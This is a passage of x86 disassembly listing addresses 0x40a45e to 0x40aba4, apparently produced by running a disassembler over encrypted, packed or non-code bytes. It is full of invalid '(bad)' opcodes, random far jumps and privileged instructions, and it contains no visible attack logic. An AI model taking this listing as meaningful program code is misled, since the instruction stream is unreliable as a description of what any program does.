  40a45e:	add    DWORD PTR [eax+eax*8-0x2d7b4ff2],esp
  40a465:	test   DWORD PTR [ecx-0x6953261c],esi
  40a46b:	iret   
  40a46c:	ins    BYTE PTR es:[edi],dx
  40a46d:	lods   eax,DWORD PTR ds:[esi]
  40a46e:	or     edx,ebx
  40a470:	dec    eax
  40a471:	sub    DWORD PTR [ecx+0x18d5e7cf],ebx
  40a477:	out    0x55,eax
  40a479:	pandn  mm7,mm4
  40a47c:	jge    0x40a4b5
  40a47e:	cmp    edi,DWORD PTR [edi+0x1f194299]
  40a484:	mov    bl,0xca
  40a486:	or     al,0xb8
  40a488:	pop    ss
  40a489:	fcmovu st,st(7)
  40a48b:	add    al,0xb6
  40a48d:	stos   BYTE PTR es:[edi],al
  40a48e:	mov    esp,0x482118b5
  40a493:	test   DWORD PTR [ebx],ecx
  40a495:	pop    ebp
  40a496:	pop    esi
  40a497:	mov    edx,0xea641b7c
  40a49c:	cld    
  40a49d:	push   ss
  40a49e:	(bad)  
  40a4a0:	sti    
  40a4a1:	sbb    ebp,DWORD PTR [ebx-0x6f]
  40a4a4:	(bad)  
  40a4a5:	(bad)  
  40a4a6:	in     al,dx
  40a4a7:	retf   0x7385
  40a4aa:	leave  
  40a4ab:	bound  edx,QWORD PTR [ecx]
  40a4ad:	pop    eax
  40a4ae:	sbb    al,0x63
  40a4b0:	jmp    0x7684:0xbdfa1374
  40a4b7:	dec    ebx
  40a4b8:	xchg   edx,eax
  40a4b9:	adc    eax,0x8aca35da
  40a4be:	push   esi
  40a4bf:	pop    es
  40a4c0:	(bad)  
  40a4c1:	adc    bh,bl
  40a4c3:	in     al,dx
  40a4c4:	and    bh,bl
  40a4c6:	scas   al,BYTE PTR es:[edi]
  40a4c7:	fisub  WORD PTR [ebp+0x11]
  40a4ca:	shl    DWORD PTR [ebp+0x51],1
  40a4cd:	das    
  40a4ce:	pop    ebx
  40a4cf:	sbb    ebp,DWORD PTR [esp+edx*1-0x29]
  40a4d3:	inc    edi
  40a4d4:	xor    BYTE PTR ds:0x4dfde3e2,ch
  40a4da:	pop    ebx
  40a4db:	loope  0x40a52a
  40a4dd:	mov    edx,edx
  40a4df:	mov    bl,0xa
  40a4e1:	fdivr  QWORD PTR [ecx]
  40a4e3:	mov    esp,0xacf0032f
  40a4e8:	and    DWORD PTR [edi+esi*2+0x3e],ebp
  40a4ec:	or     BYTE PTR [ebx],ah
  40a4ee:	adc    eax,0xb22948ba
  40a4f3:	push   ss
  40a4f4:	fldcw  WORD PTR [eiz*2-0x4d36b4c2]
  40a4fb:	xchg   esp,eax
  40a4fc:	jl     0x40a56c
  40a4fe:	sub    DWORD PTR [edi],ecx
  40a500:	mov    edi,0x6a7fc7cd
  40a505:	(bad)  
  40a506:	into   
  40a507:	mov    ds,WORD PTR [ebx]
  40a509:	in     al,0x13
  40a50b:	addr16 cli 
  40a50d:	xor    eax,0xedc6f987
  40a512:	mov    ds:0xa6970d99,eax
  40a517:	sub    DWORD PTR [ecx-0x66],ebp
  40a51a:	xacquire xchg DWORD PTR [edi-0x2],ebx
  40a51e:	sbb    bl,bh
  40a520:	jl     0x40a503
  40a522:	adc    bl,BYTE PTR [ebx-0x59]
  40a525:	sahf   
  40a526:	bound  esi,QWORD PTR [ebx-0x5]
  40a529:	sbb    al,0x1b
  40a52b:	fwait
  40a52c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a52d:	dec    eax
  40a52e:	rcr    DWORD PTR [esi+0x7d],cl
  40a531:	enter  0x472e,0x58
  40a535:	dec    esp
  40a536:	aad    0xf9
  40a538:	loop   0x40a559
  40a53a:	mov    edx,DWORD PTR [edi]
  40a53c:	push   ebp
  40a53d:	mov    ebp,0xae5cbd72
  40a542:	inc    esi
  40a543:	push   es
  40a544:	push   esi
  40a545:	pop    eax
  40a546:	cdq    
  40a547:	adc    eax,0xf86fed
  40a54c:	mov    WORD PTR [esi],?
  40a54e:	je     0x40a58a
  40a550:	push   ebx
  40a551:	xchg   edi,eax
  40a552:	inc    ebx
  40a553:	xchg   edx,eax
  40a554:	sbb    eax,0x4700026d
  40a559:	cdq    
  40a55a:	add    BYTE PTR [edi+0x72],ch
  40a55d:	lahf   
  40a55e:	push   edi
  40a55f:	add    ecx,DWORD PTR [edx+0xc38e5]
  40a565:	shr    BYTE PTR [esi],0x53
  40a568:	xor    al,0x89
  40a56a:	dec    esp
  40a56b:	pop    edx
  40a56c:	mov    WORD PTR [edi-0x22],gs
  40a56f:	test   al,0x7a
  40a571:	clc    
  40a572:	push   ebp
  40a573:	pop    esi
  40a574:	(bad)  
  40a576:	ins    BYTE PTR es:[edi],dx
  40a577:	js     0x40a5a0
  40a579:	jb     0x40a5a2
  40a57b:	jo     0x40a5e5
  40a57d:	add    al,0x9d
  40a580:	inc    eax
  40a581:	and    eax,0xd68b16de
  40a586:	call   0x8e3e:0xf23cf22
  40a58d:	mov    esi,0x86b5852b
  40a592:	sub    edx,DWORD PTR [edi+0x6e]
  40a595:	arpl   bp,sp
  40a597:	jbe    0x40a52e
  40a599:	add    al,0x24
  40a59b:	inc    ebp
  40a59c:	sbb    cl,dh
  40a59e:	push   ss
  40a59f:	(bad)  
  40a5a0:	and    eax,0xad84e3f8
  40a5a5:	cmp    ah,ah
  40a5a7:	ror    dl,1
  40a5a9:	sbb    al,0xb3
  40a5ab:	pop    ss
  40a5ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5ad:	mov    DWORD PTR [edx+0x77684dd7],esp
  40a5b3:	adc    al,0x49
  40a5b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5b6:	leave  
  40a5b7:	dec    ebp
  40a5b8:	in     al,0x68
  40a5ba:	or     edx,DWORD PTR [edx]
  40a5bc:	(bad)  
  40a5bd:	(bad)  
  40a5be:	xchg   edi,eax
  40a5bf:	xchg   edx,eax
  40a5c0:	js     0x40a584
  40a5c2:	cmp    DWORD PTR [ebx+0x2bbf715a],ebp
  40a5c8:	adc    dl,cl
  40a5ca:	xor    al,0x21
  40a5cc:	and    ah,BYTE PTR [edi+0x63]
  40a5cf:	int    0xbe
  40a5d1:	(bad)  
  40a5d2:	jge    0x40a5d5
  40a5d4:	loope  0x40a5f2
  40a5d6:	xchg   esi,eax
  40a5d7:	inc    ebp
  40a5d8:	or     edx,DWORD PTR [edi]
  40a5da:	rol    edi,1
  40a5dc:	jmp    FWORD PTR [esi+0x3eea9bca]
  40a5e2:	sub    eax,0xca1a5d16
  40a5e7:	pop    esp
  40a5e8:	push   ebx
  40a5e9:	in     al,0x5
  40a5eb:	inc    ebp
  40a5ec:	sahf   
  40a5ed:	xchg   edx,eax
  40a5ee:	sub    DWORD PTR [bx-0x5045],eax
  40a5f3:	repz xchg ecx,eax
  40a5f5:	mul    DWORD PTR [edi]
  40a5f7:	pushf  
  40a5f8:	cmp    DWORD PTR [ebp+0x77ff7b5d],edi
  40a5fe:	jmp    0x40a5f5
  40a600:	inc    ebx
  40a601:	add    dl,BYTE PTR [eax-0x28]
  40a604:	sahf   
  40a605:	and    al,0x9
  40a607:	mov    ebp,0x5f178f5e
  40a60c:	jl     0x40a597
  40a60e:	das    
  40a60f:	jge    0x40a5f6
  40a611:	inc    ebp
  40a612:	mov    edx,0xdad987c3
  40a617:	jns    0x40a5a9
  40a619:	loope  0x40a601
  40a61b:	imul   edi,DWORD PTR [edx],0x54c20d9d
  40a621:	fdivrp st(1),st
  40a623:	sub    edx,DWORD PTR [ebx]
  40a625:	ficom  WORD PTR [esi-0x71]
  40a628:	mov    bh,0x55
  40a62a:	mov    ch,0xb5
  40a62c:	retf   0x82c2
  40a62f:	and    eax,0xeb655ec5
  40a634:	push   edi
  40a635:	scas   al,BYTE PTR es:[edi]
  40a636:	nop
  40a637:	inc    esi
  40a638:	in     eax,dx
  40a639:	xchg   DWORD PTR [eax],ecx
  40a63b:	nop
  40a63c:	mov    esi,esp
  40a63e:	add    dl,ah
  40a640:	ds pop es
  40a642:	mov    al,ds:0xa6c48495
  40a647:	in     eax,0xec
  40a649:	mov    edi,0x72c3df0
  40a64e:	mov    dh,0x22
  40a650:	fwait
  40a651:	cmc    
  40a652:	retf   0xfdaf
  40a655:	fisubr DWORD PTR [edi-0x86f23cb]
  40a65b:	dec    edi
  40a65c:	mov    es,WORD PTR [ebx]
  40a65e:	add    BYTE PTR [edx],ah
  40a660:	and    BYTE PTR [edi+0x6d],dl
  40a663:	inc    eax
  40a664:	xchg   BYTE PTR [eax+0x23],dh
  40a667:	mov    edi,0x95af5d0a
  40a66c:	adc    BYTE PTR [edx+0x63eb6309],ch
  40a672:	je     0x40a6af
  40a674:	stos   BYTE PTR es:[edi],al
  40a675:	idiv   DWORD PTR [edi-0x45]
  40a678:	mov    dh,0xfc
  40a67a:	popf   
  40a67b:	in     al,0xb8
  40a67d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a67e:	inc    eax
  40a67f:	mov    ds:0x20516514,al
  40a684:	arpl   WORD PTR [edi],bx
  40a686:	xor    BYTE PTR [edi+0x3e],0xcd
  40a68a:	out    0x73,eax
  40a68c:	scas   al,BYTE PTR es:[edi]
  40a68d:	pop    ebp
  40a68e:	fwait
  40a68f:	cmp    BYTE PTR [eax],0x85
  40a692:	inc    eax
  40a693:	mov    al,ds:0xf9454494
  40a698:	or     esi,eax
  40a69a:	iret   
  40a69b:	xor    al,0xec
  40a69d:	xchg   edx,eax
  40a69e:	jnp    0x40a6b6
  40a6a0:	out    0xad,eax
  40a6a2:	sub    DWORD PTR [ecx-0x102e3f8b],edx
  40a6a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6a9:	hlt    
  40a6aa:	mov    ebx,0x4969d309
  40a6af:	pop    ecx
  40a6b0:	pop    edx
  40a6b1:	mov    WORD PTR [esi-0x2ee3735f],fs
  40a6b7:	push   edx
  40a6b8:	ret    
  40a6b9:	stc    
  40a6ba:	loop   0x40a71a
  40a6bc:	aas    
  40a6bd:	hlt    
  40a6be:	loop   0x40a65e
  40a6c0:	mov    bh,0x6c
  40a6c3:	mov    ds:0xc6a9da72,al
  40a6c8:	mov    cl,0x2b
  40a6ca:	cmp    al,0x65
  40a6cc:	adc    eax,0x17ef0450
  40a6d1:	sub    al,0x32
  40a6d3:	adc    bl,al
  40a6d5:	in     eax,0xc3
  40a6d7:	jne    0x40a735
  40a6d9:	jns    0x40a672
  40a6db:	jmp    0x374a:0x2c41d6e3
  40a6e2:	push   ss
  40a6e3:	and    bl,cl
  40a6e5:	loope  0x40a747
  40a6e7:	(bad)  
  40a6e8:	cmp    al,0xef
  40a6ea:	jg     0x40a6cc
  40a6ec:	and    BYTE PTR [edi],0x9f
  40a6ef:	js     0x40a693
  40a6f1:	pop    edx
  40a6f2:	sub    BYTE PTR [ebx+0x44efb8d9],0xfb
  40a6f9:	add    eax,DWORD PTR [eax-0x816d6b5]
  40a6ff:	sti    
  40a700:	fdivr  QWORD PTR [eax-0x2206c87]
  40a706:	cld    
  40a707:	xor    ebp,DWORD PTR [eax-0x4f]
  40a70a:	lds    ebp,FWORD PTR [ecx+0x370c73ad]
  40a710:	jbe    0x40a6fa
  40a712:	mov    ah,0x86
  40a714:	cwde   
  40a715:	push   edx
  40a716:	and    BYTE PTR [ecx+ebp*4-0x4d5756d7],al
  40a71d:	jbe    0x40a6e1
  40a71f:	leave  
  40a720:	loop   0x40a6c1
  40a722:	mov    ch,0x82
  40a724:	jne    0x40a71c
  40a726:	mov    edi,0x92686cc2
  40a72b:	mov    cl,0xf8
  40a72d:	dec    ebp
  40a72e:	les    edi,FWORD PTR [edi+0xd1bd283]
  40a734:	cmp    al,BYTE PTR [ebx]
  40a736:	cmp    eax,0x7a0a7283
  40a73b:	cmp    al,0x67
  40a73d:	out    0xd1,eax
  40a73f:	xchg   esp,eax
  40a740:	and    al,0x49
  40a742:	xor    DWORD PTR [esi],esp
  40a744:	pop    ebx
  40a745:	repnz inc bh
  40a748:	iret   
  40a749:	jle    0x40a79f
  40a74b:	adc    dl,al
  40a74d:	rol    BYTE PTR [ecx],cl
  40a74f:	not    DWORD PTR [ecx-0x72]
  40a752:	arpl   WORD PTR [edx],ax
  40a754:	pushf  
  40a755:	push   ss
  40a756:	inc    edx
  40a757:	mov    ah,0x57
  40a759:	cmc    
  40a75a:	loop   0x40a7b5
  40a75c:	scas   al,BYTE PTR es:[edi]
  40a75d:	sub    DWORD PTR [edx-0x61],ecx
  40a760:	ret    0x5388
  40a763:	test   cl,bh
  40a765:	jl     0x40a7b5
  40a767:	scas   eax,DWORD PTR es:[edi]
  40a768:	xlat   BYTE PTR ds:[ebx]
  40a769:	inc    edi
  40a76a:	sub    edi,esi
  40a76c:	repnz div edi
  40a76f:	imul   ecx
  40a771:	cmc    
  40a772:	jp     0x40a729
  40a774:	jecxz  0x40a704
  40a776:	sbb    esp,DWORD PTR [esi+0x4826555b]
  40a77c:	mov    bl,0x4c
  40a77e:	ins    BYTE PTR es:[edi],dx
  40a77f:	or     bl,ah
  40a781:	test   eax,0x7f298ff7
  40a786:	clc    
  40a787:	scas   al,BYTE PTR es:[edi]
  40a788:	lea    eax,[ecx+0x6]
  40a78b:	dec    eax
  40a78c:	idiv   DWORD PTR [ebp-0x1d2a549a]
  40a792:	retf   0xb7d5
  40a795:	fcomp  st(5)
  40a797:	ja     0x40a763
  40a799:	and    eax,0xe0123e04
  40a79e:	iret   
  40a79f:	addr16 push ss
  40a7a1:	cmp    eax,0x6621158e
  40a7a6:	pmaddwd mm6,mm7
  40a7a9:	in     eax,dx
  40a7aa:	jp     0x40a7fa
  40a7ac:	add    DWORD PTR [ebx+edi*1-0x76],esi
  40a7b0:	loope  0x40a762
  40a7b2:	(bad)
  40a7b5:	and    bl,cl
  40a7b7:	xor    eax,0x60673579
  40a7bc:	call   0x7e90ff1e
  40a7c1:	jmp    0x40a758
  40a7c3:	xor    DWORD PTR [eax],ebp
  40a7c5:	imul   edx,DWORD PTR [ebp-0x62],0x15
  40a7c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7ca:	inc    eax
  40a7cb:	mov    ds:0x7fc38fa7,eax
  40a7d0:	xor    eax,0xd92363a7
  40a7d5:	daa    
  40a7d6:	div    dl
  40a7d8:	push   edi
  40a7d9:	cmp    al,0x3a
  40a7db:	push   es
  40a7dc:	add    DWORD PTR [ecx],edx
  40a7de:	add    DWORD PTR [eax+0x6b40acf],0x30285c6d
  40a7e8:	retf   
  40a7e9:	or     al,0xb3
  40a7eb:	fld    DWORD PTR [ecx]
  40a7ed:	out    0xb6,eax
  40a7ef:	scas   eax,DWORD PTR es:[edi]
  40a7f0:	icebp  
  40a7f1:	ror    DWORD PTR [edi],1
  40a7f3:	mov    edi,0x5dbb7687
  40a7f8:	dec    ebp
  40a7f9:	jo     0x40a7ac
  40a7fb:	jmp    0x413:0x4159367d
  40a802:	(bad)  
  40a804:	ss repz stc 
  40a807:	pushf  
  40a808:	(bad)  
  40a809:	cld    
  40a80a:	mov    ecx,0x86e5732f
  40a80f:	in     eax,0xcc
  40a811:	mov    ecx,0x4f0e1987
  40a816:	shr    ebx,1
  40a818:	outs   dx,DWORD PTR ds:[esi]
  40a819:	cmp    DWORD PTR [esi+0x70ceb157],esi
  40a81f:	outs   dx,DWORD PTR ds:[esi]
  40a820:	mov    ebp,DWORD PTR [edx]
  40a822:	test   al,0xba
  40a824:	out    dx,eax
  40a825:	clc    
  40a826:	jp     0x40a7b3
  40a828:	or     edx,edi
  40a82a:	mov    bh,0x35
  40a82c:	call   0x49b4:0x72fa5898
  40a833:	popa   
  40a834:	in     eax,dx
  40a835:	and    bh,bh
  40a837:	(bad)  
  40a839:	std    
  40a83a:	outs   dx,BYTE PTR ds:[esi]
  40a83b:	xor    DWORD PTR [eax+0x165d00a2],edx
  40a841:	or     al,0x7
  40a843:	lods   eax,DWORD PTR ds:[esi]
  40a844:	lds    edi,FWORD PTR [edx+edx*4+0x28193976]
  40a84b:	mov    WORD PTR [ecx+0x381cb158],es
  40a851:	mov    esp,0xc4818b0b
  40a856:	jb     0x40a874
  40a858:	add    BYTE PTR [eax+0x11],ch
  40a85b:	jmp    0xe3de:0x951c61aa
  40a862:	sbb    esp,DWORD PTR [esp+ecx*2]
  40a865:	mov    esi,0xefc5b4d1
  40a86a:	xchg   esi,eax
  40a86b:	scas   eax,DWORD PTR es:[edi]
  40a86c:	movq   mm3,QWORD PTR [edi]
  40a86f:	adc    al,0xee
  40a871:	xor    eax,0xfda7707a
  40a876:	(bad)  
  40a877:	sbb    BYTE PTR [edx],cl
  40a879:	arpl   WORD PTR [eax],bp
  40a87b:	repnz pushf 
  40a87d:	xor    al,0x4d
  40a87f:	pop    ebp
  40a880:	scas   al,BYTE PTR es:[edi]
  40a881:	mov    ecx,0x695a89ef
  40a886:	retf   0x9bad
  40a889:	sti    
  40a88a:	sbb    al,0x1e
  40a88c:	add    BYTE PTR [edx],dh
  40a88e:	dec    esp
  40a88f:	add    ah,dl
  40a891:	jge    0x40a893
  40a893:	(bad)  
  40a894:	mov    edi,0x1c45d8d8
  40a899:	adc    al,0x4c
  40a89b:	or     BYTE PTR [edi-0x3],cl
  40a89e:	pop    esp
  40a89f:	(bad)  
  40a8a0:	sbb    al,0x1c
  40a8a2:	test   BYTE PTR [edx],ch
  40a8a4:	xchg   ecx,eax
  40a8a5:	je     0x40a8e2
  40a8a7:	or     DWORD PTR [ebp-0x5b1e3d92],edi
  40a8ad:	and    al,0xa7
  40a8af:	fs in  eax,0x2a
  40a8b2:	ds push ebp
  40a8b4:	outs   dx,DWORD PTR ds:[esi]
  40a8b5:	push   ds
  40a8b6:	fbstp  TBYTE PTR [ebx-0x5d]
  40a8b9:	dec    esp
  40a8ba:	std    
  40a8bb:	or     DWORD PTR [ecx+0x50],ebx
  40a8be:	cmc    
  40a8bf:	lock fld TBYTE PTR [esi+0x19871ed8]
  40a8c6:	pop    ecx
  40a8c7:	ss add eax,0x7e23ec6a
  40a8cd:	test   al,0xd8
  40a8cf:	and    al,0x71
  40a8d1:	or     eax,0x5aef5f17
  40a8d6:	mov    ebx,0xdddbd921
  40a8db:	push   edi
  40a8dc:	clc    
  40a8dd:	hlt    
  40a8de:	iret   
  40a8df:	ds (bad) 
  40a8e1:	jmp    0xdd68d0b9
  40a8e6:	je     0x40a8b0
  40a8e8:	inc    edi
  40a8e9:	push   cs
  40a8ea:	aam    0x5a
  40a8ec:	lds    eax,FWORD PTR [eax]
  40a8ee:	ret    0x24ff
  40a8f1:	dec    ecx
  40a8f2:	dec    eax
  40a8f3:	xchg   edx,eax
  40a8f4:	test   BYTE PTR [edi],bh
  40a8f6:	cld    
  40a8f7:	repnz xor edi,DWORD PTR [ebx+edi*8-0x45]
  40a8fc:	xlat   BYTE PTR ds:[ebx]
  40a8fd:	fnstcw WORD PTR [edx]
  40a8ff:	icebp  
  40a900:	and    al,0xc3
  40a902:	int    0x53
  40a904:	or     al,0xaa
  40a906:	xor    al,0xdf
  40a908:	fcom   DWORD PTR [esi-0x67104572]
  40a90e:	sub    al,0xe1
  40a910:	(bad)  
  40a911:	imul   eax,DWORD PTR [eax+eiz*8],0x33f036c7
  40a918:	or     al,0x6f
  40a91a:	data16 loope 0x40a913
  40a91d:	mov    BYTE PTR [esi+0x37],bh
  40a920:	stos   DWORD PTR es:[edi],eax
  40a921:	jbe    0x40a8b8
  40a923:	cmp    DWORD PTR [ecx],eax
  40a925:	fimul  WORD PTR [ecx]
  40a927:	test   al,0x3d
  40a929:	add    ecx,DWORD PTR [eax+0x66d680c2]
  40a92f:	and    al,0xca
  40a931:	push   esp
  40a932:	jae    0x40a985
  40a934:	mov    eax,0xe0db9663
  40a939:	jl     0x40a979
  40a93b:	pop    edi
  40a93c:	in     eax,0x24
  40a93e:	mov    bh,0xbc
  40a940:	mov    edx,DWORD PTR [ecx]
  40a942:	add    BYTE PTR [eax],bh
  40a944:	sahf   
  40a945:	or     DWORD PTR [eax-0x4],esp
  40a948:	inc    DWORD PTR [ebp-0x51]
  40a94b:	or     DWORD PTR [eax-0x2d792f5b],eax
  40a951:	das    
  40a952:	jne    0x40a968
  40a954:	sub    dh,BYTE PTR [eax+0x15]
  40a957:	mov    ebp,0x7707480b
  40a95c:	mov    dh,0xe5
  40a95e:	sbb    DWORD PTR [edi+esi*2],0x5f
  40a962:	jae    0x40a93f
  40a964:	sub    dl,BYTE PTR [esi]
  40a966:	jo     0x40a90f
  40a968:	arpl   WORD PTR [ebp-0xb4d676c],sp
  40a96e:	(bad)  [ebp+0x7f57357e]
  40a974:	dec    DWORD PTR [ecx-0x66]
  40a977:	jo     0x40a95c
  40a979:	out    0x2d,al
  40a97b:	push   cs
  40a97c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a97d:	ror    BYTE PTR ds:0x12e116e,cl
  40a983:	sub    BYTE PTR [edx+ebx*1+0x1b87426c],ch
  40a98a:	out    dx,al
  40a98b:	bswap  edi
  40a98d:	add    ch,BYTE PTR [edx]
  40a98f:	pop    edi
  40a990:	inc    eax
  40a991:	add    BYTE PTR [eax],cl
  40a993:	pop    es
  40a994:	sub    BYTE PTR [edx-0x47],cl
  40a997:	nop
  40a998:	pusha  
  40a999:	mov    bh,0x93
  40a99b:	ror    BYTE PTR [edx+0x25],1
  40a99e:	mov    bl,0xc
  40a9a0:	mov    edi,0x2868815e
  40a9a5:	call   0xeb96368c
  40a9aa:	push   cs
  40a9ab:	xor    al,0x3d
  40a9ad:	jp     0x40a9ba
  40a9af:	mov    ch,0x32
  40a9b1:	add    edx,0x23837ec7
  40a9b7:	sbb    DWORD PTR [edx+0x74],eax
  40a9ba:	into   
  40a9bb:	fucompp 
  40a9bd:	sbb    bh,BYTE PTR [esi+0x7d31a583]
  40a9c3:	jne    0x40a9f5
  40a9c5:	xor    DWORD PTR [esi+0x60],eax
  40a9c8:	mov    ah,0x61
  40a9ca:	mov    bl,0x73
  40a9cc:	cdq    
  40a9cd:	pop    edi
  40a9ce:	cli    
  40a9cf:	dec    ebx
  40a9d0:	add    ebx,DWORD PTR [esi]
  40a9d2:	jle    0x40a9c4
  40a9d4:	fs aad 0xdb
  40a9d7:	lods   eax,DWORD PTR ds:[esi]
  40a9d8:	pop    edx
  40a9d9:	(bad)  
  40a9da:	stos   DWORD PTR es:[edi],eax
  40a9db:	cmp    cl,bl
  40a9dd:	adc    edi,ebx
  40a9df:	xchg   ebp,eax
  40a9e0:	push   edx
  40a9e1:	mov    ah,0x5a
  40a9e3:	sub    eax,0xcbeefc5e
  40a9e8:	jl     0x40a9db
  40a9ea:	(bad)  
  40a9eb:	mov    esi,0x11e36f43
  40a9f0:	inc    esi
  40a9f1:	pop    ebx
  40a9f2:	sbb    BYTE PTR [si],cl
  40a9f5:	dec    edi
  40a9f6:	xchg   ecx,eax
  40a9f7:	mov    dh,0x17
  40a9f9:	leave  
  40a9fa:	mov    ds:0x77c47a8a,al
  40aa00:	mov    dh,0x42
  40aa02:	jae    0x40aa27
  40aa04:	push   ebx
  40aa05:	int3   
  40aa06:	xchg   BYTE PTR [ebp+0x62],ch
  40aa09:	push   ecx
  40aa0a:	(bad)  
  40aa0b:	aad    0xa8
  40aa0d:	test   DWORD PTR [eax+0x7d8b6f],edi
  40aa13:	push   ecx
  40aa14:	mov    ch,0xad
  40aa16:	xchg   edx,eax
  40aa17:	push   0x49
  40aa19:	jo     0x40a9d6
  40aa1b:	mov    al,0xff
  40aa1d:	dec    ebx
  40aa1e:	or     eax,0x96ed2509
  40aa23:	hlt    
  40aa24:	mov    ?,ecx
  40aa26:	sbb    BYTE PTR [eax-0x6b99b65e],dh
  40aa2c:	bound  esi,QWORD PTR [edi+0x77]
  40aa2f:	ja     0x40aa86
  40aa31:	sbb    dh,BYTE PTR [eax+0x1]
  40aa34:	pop    esp
  40aa35:	pop    ecx
  40aa36:	jge    0x40a9fd
  40aa38:	sti    
  40aa39:	and    ebp,DWORD PTR [edi-0x75]
  40aa3c:	add    DWORD PTR [esi+edi*1+0x0],edx
  40aa40:	scas   eax,DWORD PTR es:[edi]
  40aa41:	lock pop ecx
  40aa43:	loope  0x40aa91
  40aa45:	cmp    BYTE PTR [eax-0xbef7b92],0x7a
  40aa4c:	cmp    eax,0x28a12492
  40aa51:	or     ah,BYTE PTR [esi]
  40aa53:	xchg   ebx,eax
  40aa54:	or     DWORD PTR [ebx+0x2e9ee8d1],esp
  40aa5a:	je     0x40aab8
  40aa5c:	pop    edi
  40aa5d:	rcr    BYTE PTR [ebp+0x4a77ff3c],0xe
  40aa64:	push   0xffffff9e
  40aa66:	dec    edi
  40aa67:	or     BYTE PTR [ecx-0x17],al
  40aa6a:	pop    es
  40aa6b:	cmp    DWORD PTR [ecx+0x636a0873],eax
  40aa71:	call   0x6b59862a
  40aa76:	js     0x40aa5b
  40aa78:	int    0xeb
  40aa7a:	call   0xbbab32f1
  40aa7f:	clc    
  40aa80:	jg     0x40aa4a
  40aa82:	add    DWORD PTR [eax+0x4e100604],esi
  40aa88:	jmp    0x810a:0x918a9a7a
  40aa8f:	fwait
  40aa90:	sub    eax,eax
  40aa92:	sub    DWORD PTR [edx+0x68],edx
  40aa95:	ins    BYTE PTR es:[edi],dx
  40aa96:	lods   eax,DWORD PTR ds:[esi]
  40aa97:	mov    dh,0x4b
  40aa99:	pmaxsw mm3,QWORD PTR [esi]
  40aa9c:	and    al,0x4c
  40aa9e:	and    ax,0x3585
  40aaa2:	pusha  
  40aaa3:	jecxz  0x40ab1e
  40aaa5:	add    ah,BYTE PTR [edx+0xfa6fbfc]
  40aaab:	pusha  
  40aaac:	aad    0x1a
  40aaae:	xor    DWORD PTR ds:0x5dff805f,0xb
  40aab5:	or     esi,DWORD PTR [esi]
  40aab7:	fadd   DWORD PTR [ebx+esi*8+0x1c]
  40aabb:	push   ebp
  40aabc:	scas   eax,DWORD PTR es:[edi]
  40aabd:	out    dx,eax
  40aabe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aabf:	adc    eax,0x1845cdaf
  40aac4:	fisttp DWORD PTR [esi]
  40aac6:	jbe    0x40ab39
  40aac8:	mov    esp,0xd6b6414f
  40aacd:	rcl    BYTE PTR [esi+0x7],1
  40aad0:	jl     0x40aab8
  40aad2:	addr16 data16 cld 
  40aad5:	fsub   QWORD PTR [edi]
  40aad7:	jle    0x40aa7b
  40aad9:	mov    ds:0x70274dfe,al
  40aade:	nop
  40aadf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aae0:	shr    DWORD PTR [edi+0x4e9dfca9],cl
  40aae6:	xchg   DWORD PTR [ebx-0x69],ecx
  40aae9:	scas   al,BYTE PTR es:[edi]
  40aaea:	lock pop ds
  40aaec:	(bad)  
  40aaed:	repz push edi
  40aaef:	enter  0x16f5,0x67
  40aaf3:	mov    bh,0x1e
  40aaf5:	pusha  
  40aaf6:	xor    BYTE PTR [eax],bh
  40aaf8:	inc    ebp
  40aaf9:	stos   DWORD PTR es:[edi],eax
  40aafa:	mov    ebp,0xeab23181
  40aaff:	ins    BYTE PTR es:[edi],dx
  40ab00:	sub    dh,BYTE PTR [esi-0x3ce293d1]
  40ab06:	push   esi
  40ab07:	mov    dl,0x8d
  40ab09:	pop    edx
  40ab0a:	or     esp,DWORD PTR [ebp+0x51]
  40ab0d:	ins    BYTE PTR es:[edi],dx
  40ab0e:	rcr    esp,0x16
  40ab11:	ins    DWORD PTR es:[edi],dx
  40ab12:	mov    eax,ds:0xdfb5037a
  40ab17:	cmc    
  40ab18:	adc    ebp,DWORD PTR [esi]
  40ab1a:	stos   BYTE PTR es:[edi],al
  40ab1b:	cmp    eax,0xfc28019e
  40ab20:	iret   
  40ab21:	or     ebp,eax
  40ab23:	jbe    0x40ab51
  40ab25:	addr16 iret 
  40ab27:	in     al,dx
  40ab28:	push   eax
  40ab29:	xchg   esi,eax
  40ab2a:	retf   
  40ab2b:	adc    DWORD PTR [eax+0x534d3bf0],eax
  40ab31:	out    0xf3,al
  40ab33:	stc    
  40ab34:	sub    dl,BYTE PTR [ebx+0x617036f6]
  40ab3a:	lds    edx,FWORD PTR [ebp-0x78e36411]
  40ab40:	add    DWORD PTR [edx+eax*1+0x2b2bc15a],ebx
  40ab47:	mov    ds:0x3ca5deee,al
  40ab4c:	cmp    ch,BYTE PTR [edx+0x65]
  40ab4f:	mov    ebp,0xc179e5d2
  40ab54:	push   0x854a42d4
  40ab59:	(bad)  
  40ab5a:	jae    0x40ab02
  40ab5c:	shr    ecx,cl
  40ab5e:	xchg   ecx,eax
  40ab5f:	das    
  40ab60:	cld    
  40ab61:	popf   
  40ab62:	mov    dl,0x0
  40ab64:	mov    eax,0x788058f3
  40ab69:	lahf   
  40ab6a:	jg     0x40ab02
  40ab6c:	xchg   ebp,eax
  40ab6d:	mov    eax,es
  40ab6f:	sbb    BYTE PTR [ebx+0x3e],al
  40ab72:	lahf   
  40ab73:	push   edi
  40ab74:	imul   eax,DWORD PTR ds:0x3f309800,0xffffff9b
  40ab7b:	xor    eax,0x87b4ba5c
  40ab80:	xor    eax,0x4821d75d
  40ab85:	or     DWORD PTR [esp+eiz*2-0x5b],0x1acc2617
  40ab8d:	loope  0x40ab24
  40ab8f:	fbstp  TBYTE PTR [ebp-0x3e]
  40ab92:	pop    esi
  40ab93:	fld    DWORD PTR ds:0x46b16158
  40ab99:	jp     0x40abfb
  40ab9b:	adc    BYTE PTR [eax-0x1d],bl
  40ab9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab9f:	adc    ebp,edi
  40aba1:	je     0x40abff
  40aba3:	dec    eax
  40aba4:	jo     0x40ac15
